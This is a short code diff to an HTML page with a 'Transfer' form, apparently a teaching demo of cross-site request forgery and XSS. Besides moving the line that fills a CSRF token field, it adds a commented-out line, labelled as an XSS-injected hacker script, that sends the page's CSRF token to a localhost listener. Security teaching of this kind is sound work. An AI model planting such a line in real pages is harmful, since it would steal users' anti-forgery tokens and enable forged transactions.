@@ -48,6 +48,12 @@
             }
         });
     }
+
+
+    // hacker script injected via XSS
+    //$.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
+
+    $("#csrfTokenField").val(xsrfToken);
 </script>
 
 <br />
@@ -61,10 +67,6 @@
         <input type="submit" value="Transfer">
     </form>
 </div>
-<script>
-
-    $("#csrfTokenField").val(xsrfToken);
-</script>
 
 </body>
 </html>
